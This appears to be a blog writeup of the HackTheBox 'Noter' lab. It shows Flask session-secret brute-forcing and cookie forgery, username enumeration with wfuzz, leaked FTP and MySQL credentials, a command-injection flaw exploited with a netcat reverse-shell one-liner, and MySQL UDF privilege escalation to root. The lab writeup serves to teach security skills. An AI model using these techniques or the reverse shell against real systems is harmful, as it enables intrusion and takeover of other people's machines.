<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Noter writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Summary This medium box was quite tricky, especially the root step, which took a while to figure out. The box focuses on exploiting a flask web application, alongside enumeration an ftp service hoste on the box. Finally to get root privileges, you have to exploit the fact that you access to mysql as root, which you can leverage into reading the root flag." /><meta property="og:description" content="Summary This medium box was quite tricky, especially the root step, which took a while to figure out. The box focuses on exploiting a flask web application, alongside enumeration an ftp service hoste on the box. Finally to get root privileges, you have to exploit the fact that you access to mysql as root, which you can leverage into reading the root flag." /><link rel="canonical" href="https://bitisg.github.io/posts/Noter/" /><meta property="og:url" content="https://bitisg.github.io/posts/Noter/" /><meta property="og:site_name" content="BitisGabonica" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-25T12:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Noter writeup" /><meta name="twitter:site" content="@BitisGabonica1" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-25T12:00:00+02:00","datePublished":"2022-09-25T12:00:00+02:00","description":"Summary This medium box was quite tricky, especially the root step, which took a while to figure out. The box focuses on exploiting a flask web application, alongside enumeration an ftp service hoste on the box. Finally to get root privileges, you have to exploit the fact that you access to mysql as root, which you can leverage into reading the root flag.","headline":"Noter writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://bitisg.github.io/posts/Noter/"},"url":"https://bitisg.github.io/posts/Noter/"}</script><title>Noter writeup | BitisGabonica</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BitisGabonica"><meta name="application-name" content="BitisGabonica"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/sui.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BitisGabonica</a></div><div class="site-subtitle font-italic">CTF writeups and other stuff</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/BitisG" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/BitisGabonica1" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xBitisGabonica','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Noter writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/boxes/noter/Noter.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Noter writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1664100000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-25 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1466 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><h2 id="summary"><span class="mr-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This medium box was quite tricky, especially the root step, which took a while to figure out. The box focuses on exploiting a flask web application, alongside enumeration an ftp service hoste on the box. Finally to get root privileges, you have to exploit the fact that you access to mysql as root, which you can leverage into reading the root flag.</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We start out by doing an nmap port scan.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/noter]
</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.146.253
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-25 20:21 CEST
Nmap scan report for 10.129.146.253
Host is up (0.054s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
</span><span class="gp">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
</span><span class="gp">Service Info: OSs: Unix, Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds
</span></pre></table></code></div></div><p>The system has three ports open. Port 21, 22 and 5000, which is hosting a http service. We also note that the http service is using Werkzeug, meaning that the web application hosted on the port is most likely a flask application. If we visit the application we get greeted with the following note taking application:</p><p><img data-src="/assets/img/boxes/noter/welcome.png" alt="Noter landing page" data-proofer-ignore> <em>Noter landing page</em></p><p>Once we login, we notice that we have a session cookie.</p><p><img data-src="/assets/img/boxes/noter/cookie.png" alt="Registration and cookie" data-proofer-ignore> <em>Registration and cookie</em></p><p>We can use <code class="language-plaintext highlighter-rouge">flask-unsign</code> to decode the cookie and try to find the secret it was signed with:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/noter]
</span><span class="gp">└─$</span><span class="w"> </span>flask-unsign <span class="nt">-d</span> <span class="nt">-c</span> eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Yrc3eg.PuthvwTy0NMMCxNs8N_GneHU-9c
<span class="go">{'logged_in': True, 'username': 'test'}

┌──(bitis㉿workstation)-[~/htb/Machines/noter]
</span><span class="gp">└─$</span><span class="w"> </span>flask-unsign <span class="nt">-u</span> <span class="nt">-c</span> eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Yrc3eg.PuthvwTy0NMMCxNs8N_GneHU-9c
<span class="go">[*] Session decodes to: {'logged_in': True, 'username': 'test'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
</span><span class="gp">[*] Attempted (2048): -----BEGIN PRIVATE KEY-----gt;</span><span class="w">
</span><span class="go">[*] Attempted (11136): Z5Ke168AcyTrZwlNW3OZ1H87liw3Of
</span><span class="gp">[+] Found secret key after 18560 attemptsMy_API_Key&gt;</span>e
<span class="go">'secret123'
</span></pre></table></code></div></div><p>We have now found the secret key used to sign the session cookie. This means that we can create our own cookie, potentially login in as other users on the site. To enumerate users, we can use the login functionality of the site. If we attempt to login with a invalid user name, the application tells us “Invalid crdentials”</p><p><img data-src="/assets/img/boxes/noter/invalidCredentials.png" alt="invalid crdentials " data-proofer-ignore></p><p>However if we attempt to login as a existing user but with a wrong password we get told “Invalid login”</p><p><img data-src="/assets/img/boxes/noter/invalidLogin.png" alt="invalid login" data-proofer-ignore></p><p>We can use wfuzz to fuzz the application for valid usernames like so:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/noter]
</span><span class="gp">└─$</span><span class="w"> </span>wfuzz <span class="nt">-u</span> <span class="s1">'http://noter.htb:5000/login'</span> <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s1">'username=FUZZ&amp;password=aaaadwhadw'</span> <span class="nt">-w</span> /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt <span class="nt">--hs</span> <span class="s2">"Invalid credentials"</span>
<span class="go"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://noter.htb:5000/login
Total requests: 8295455

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000113:   200        68 L     110 W      2032 Ch     "blue"                                                                                                                                                                     
000007198:   200        68 L     110 W      2032 Ch     "Blue"             
</span></pre></table></code></div></div><p>As we can see from the output of wfuzz we have found two usernames, “blue” and “Blue”. We can then sign a flask cookie using <code class="language-plaintext highlighter-rouge">flask-unsign</code> once more.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/noter]
</span><span class="gp">└─$</span><span class="w"> </span>flask-unsign <span class="nt">--sign</span> <span class="nt">--cookie</span> <span class="s2">"{'logged_in': True, 'username': 'blue'}"</span> <span class="nt">--secret</span> <span class="s1">'secret123'</span>
<span class="go">eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YrdHUg.Pp4Ss88nFXoNRA5W7jHUkzkZ-9c
</span></pre></table></code></div></div><p>Using this cookie we can go to the “blue” notes. In one of the notes are the ftp credentials <code class="language-plaintext highlighter-rouge">blue:blue@Noter!</code></p><p><img data-src="/assets/img/boxes/noter/note.png" alt="blue note" data-proofer-ignore></p><p>While scoping out the ftp service we find a pdf.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>┌──(bitis㉿workstation)-[~/htb/Machines/noter]
└─$ ftp noter.htb
Connected to noter.htb.
220 (vsFTPd 3.0.3)
Name (noter.htb:bitis): blue
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||15193|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
226 Directory send OK.
ftp&gt; get policy.pdf
local: policy.pdf remote: policy.pdf
229 Entering Extended Passive Mode (|||46037|)
150 Opening BINARY mode data connection for policy.pdf (12569 bytes).
100% |***********************************************************************************************************************************************************************************************| 12569      149.00 KiB/s    00:00 ETA
226 Transfer complete.
12569 bytes received in 00:00 (51.96 KiB/s)
</pre></table></code></div></div><p>The pdf contains the line: <code class="language-plaintext highlighter-rouge">4. Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)</code>. We can also see that the pdf was written by ftp_admin. If we try to login as ftp_admin on the ftp service while making sure to follow the default password scheme we get access:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>┌──(bitis㉿workstation)-[~/htb/Machines/noter]
└─$ ftp noter.htb 
Connected to noter.htb.
220 (vsFTPd 3.0.3)
Name (noter.htb:bitis): ftp_admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||31864|)
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
ftp&gt; 
</pre></table></code></div></div><p>Downloading the two app backups and analyzing them, we immediatly see something interesting. One of the backups contains SQL credentials:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="c1"># Config MySQL
</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_HOST'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'localhost'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_USER'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'root'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_PASSWORD'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'Nildogg36'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_DB'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'app'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_CURSORCLASS'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'DictCursor'</span>

<span class="c1"># init MYSQL
</span><span class="n">mysql</span> <span class="o">=</span> <span class="n">MySQL</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</pre></table></code></div></div><p>The other backup contains the following code snippet:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="c1"># Export remote
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/export_note_remote'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
<span class="o">@</span><span class="n">is_logged_in</span>
<span class="k">def</span> <span class="nf">export_note_remote</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>

            <span class="n">status</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="n">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">error</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">):</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">r</span> <span class="o">=</span> <span class="n">pyrequest</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                    <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
                    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"node misc/md-to-pdf.js  $'</span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s">' </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="s">"</span>
                    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">)</span>

                    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">):</span>

                        <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

                    <span class="k">else</span><span class="p">:</span>
                        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"Error occured while exporting the !"</span><span class="p">)</span>

                <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"Error occured!"</span><span class="p">)</span>


            <span class="k">else</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="s">"Error occured while exporting ! (</span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
            
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="s">"Error occured while exporting ! (</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
</pre></table></code></div></div><p>In short, the code takes a .md file from a url, attempts to convert it into a pdf, and also executes the contents of the file. This means if we make a .md file containing a reverse shell we should be able to get into the machine.</p><p>I created a file named note.md containing the following rever shell oneliner: <code class="language-plaintext highlighter-rouge">' rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.17.182 4444 &gt;/tmp/f; #</code>.</p><p>We then get a reverse shell when exporting the note:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~]
</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4444            
<span class="go">listening on [any] 4444 ...
connect to [10.10.17.182] from (UNKNOWN) [10.129.146.253] 34658
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=1001(svc) gid=1001(svc) groups=1001(svc)
</span></pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>After adding our public key to the authorized_keys file we can ssh in as the svc user to get a more stable shell.</p><p>Since we had credentials to the mysql database, and since mysqld was running as root, it might be interesting to try the exploit found <a href="https://www.exploit-db.com/exploits/1518">here</a>. I ran the following commands to get the flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="gp">MariaDB [mysql]&gt;</span><span class="w"> </span>create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
<span class="go">Query OK, 0 rows affected (0.014 sec)

</span><span class="gp">MariaDB [mysql]&gt;</span><span class="w"> </span>insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/home/svc/raptor_udf2.so'</span><span class="o">))</span><span class="p">;</span>
<span class="go">Query OK, 1 row affected (0.004 sec)

</span><span class="gp">MariaDB [mysql]&gt;</span><span class="w"> </span>show variables like <span class="s1">'%plugin%'</span><span class="p">;</span>
<span class="go">+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
2 rows in set (0.002 sec)

</span><span class="gp">MariaDB [mysql]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="k">*</span> from foo into dumpfile <span class="s1">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'</span><span class="p">;</span>
<span class="go">Query OK, 1 row affected (0.001 sec)

</span><span class="gp">MariaDB [mysql]&gt;</span><span class="w"> </span>create <span class="k">function </span>do_system returns integer soname <span class="s1">'raptor_udf2.so'</span><span class="p">;</span>
<span class="go">Query OK, 0 rows affected (0.001 sec)

</span><span class="gp">MariaDB [mysql]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="k">*</span> from mysql.func<span class="p">;</span>
<span class="go">+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.001 sec)

</span><span class="gp">MariaDB [mysql]&gt;</span><span class="w"> </span><span class="k">select </span>do_system<span class="o">(</span><span class="s1">'cat /root/root.txt &gt; /tmp/flag.txt;chown svc:svc /tmp/flag.txt'</span><span class="o">)</span><span class="p">;</span>
<span class="go">+-----------------------------------------------------------------------------+
</span><span class="gp">| do_system('cat /root/root.txt &gt;</span><span class="w"> </span>/tmp/flag.txt<span class="p">;</span><span class="nb">chown </span>svc:svc /tmp/flag.txt<span class="s1">') |
</span><span class="go">+-----------------------------------------------------------------------------+
|                                                                           0 |
+-----------------------------------------------------------------------------+
1 row in set (0.005 sec)

</span><span class="gp">MariaDB [mysql]&gt;</span><span class="w"> </span><span class="se">\!</span> sh
<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /tmp/flag.txt
<span class="go">0780ed0d4344ec8598ab32e7812f629f
</span><span class="gp">$</span><span class="w"> 
</span></pre></table></code></div></div><p>Rooted!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/medium-box/" class="post-tag no-text-decoration" >medium-box</a> <a href="/tags/fuzzing/" class="post-tag no-text-decoration" >fuzzing</a> <a href="/tags/flask-unsign/" class="post-tag no-text-decoration" >flask-unsign</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >mysql</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Noter writeup - BitisGabonica&amp;url=https://bitisg.github.io/posts/Noter/" data-toggle="tooltip" data-placement="top" title="Twitter" 